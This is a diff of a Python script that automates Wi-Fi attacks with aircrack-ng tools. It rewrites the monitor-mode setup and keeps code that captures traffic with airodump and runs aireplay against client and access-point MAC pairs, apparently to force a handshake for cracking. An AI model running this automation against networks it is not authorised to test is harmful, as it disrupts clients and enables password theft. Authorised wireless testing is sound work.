@@ -21,52 +21,37 @@ def check_user():
 
 # Starts monitor interface
 def start_mon():
-	try:
-		wifi_iface = str(input("Wireless interface: "))
-		channel = str(input("Channel (to monitor): "))
-	except:
-		print("Something went wrong!")
-
-	try:
-		p1 = subprocess.Popen(["ip", "link"], stdout=subprocess.PIPE) # Try to find monX
-		p2 = subprocess.Popen(["awk", "{print $2}"], stdin=p1.stdout, stdout=subprocess.PIPE)
-		output = p2.communicate()[0]
-		output=output.split()
-		output=str(output)
-
-		#FIX THIS SHIT
-		if re.search(r"mon.", output):
-			print("Found monitor interface.")
-		else:
-			derp=subprocess.check_output(["airmon-ng", "start", wifi_iface, channel]) # Start capture
-	except:
-		print("derp")
 	
+
 	try:
-		p1 = subprocess.Popen(["ip", "link"], stdout=subprocess.PIPE) # Try to find mon0
-		p2 = subprocess.Popen(["awk", "{print $2}"], stdin=p1.stdout, stdout=subprocess.PIPE)
-		output = p2.communicate()[0]
-		output=output.split()
-		output=str(output)
-		if "b'mon0:'" in output:
-			while True:
-				ans = str(input("Found interface mon0. Is this correct? (y/n): "))
-				if ans == 'y':
-					mon_iface="mon0"
-					break
-				elif ans == 'n':
-					mon_iface = str(input("Monitor interface: "))
-					if not mon_iface:
-						print("You suck.")
-						exit(1)
-					else:
-						break
+		print("We will now try to enable the monitor mode. If already enabled, leave empty.")
+		wifi_iface = str(input("Wireless interface: ")) 
+		channel = str(input("Channel: "))
+
+		if len(wifi_iface) == 0:
+			pass
 		else:
-			subprocess.Popen(["airmon-ng"])
+			# Enable monitor mode, exit if returncode is other than 0
+			try:
+					subprocess.check_call(["airmon-ng", "start", wifi_iface, channel])
+			except subprocess.CalledProcessError as e:
+				print("ERROR! Could not enable monitor mode: \n" + str(e))
+				print("Exiting..")
+				exit(1)
+
+		try:
+			print("Now, please specify the monitor interface!")
+			print("Available monitor devices according to iw:")
+			subprocess.call(['iw', 'dev'])
 			mon_iface = str(input("Monitor interface: "))
-		return mon_iface, channel
+			return mon_iface, channel
+
+		except subprocess.CalledProcessError as e:
+			print("ERROR! Could not get list of interfaces: \n" + str(e))
+			print("Exiting..")
+			exit(1)
 	except:
-		print("Something went wrong!")
+		print("Something bad happened..")
 
 # Starts airodump
 def start_airodump(iface_ch):
@@ -104,7 +89,7 @@ def start_aireplay(ap_mac, station_mac, iface_ch):
 		exit(1)
 	return True
 
-# MAIN
+###### MAIN ######
 if not check_user(): # Call function to check if user is root
 	exit(1)
 
@@ -122,7 +107,7 @@ while True:
 
 iface_ch = start_mon() # Start monitor interface
 
-if len(iface_ch) == 2: # If we got 2 values after starting monitor interface, start airodump
+if len(iface_ch) == 2:
 	fname = start_airodump(iface_ch)
 
 
@@ -153,3 +138,5 @@ for line in f_data:
 for mac in station_macs:
 	if station_macs[mac] in ap_macs:
 		start_aireplay(station_macs[mac], mac, iface_ch)
+
+print("Now run aircrack-ng on the .cap file")
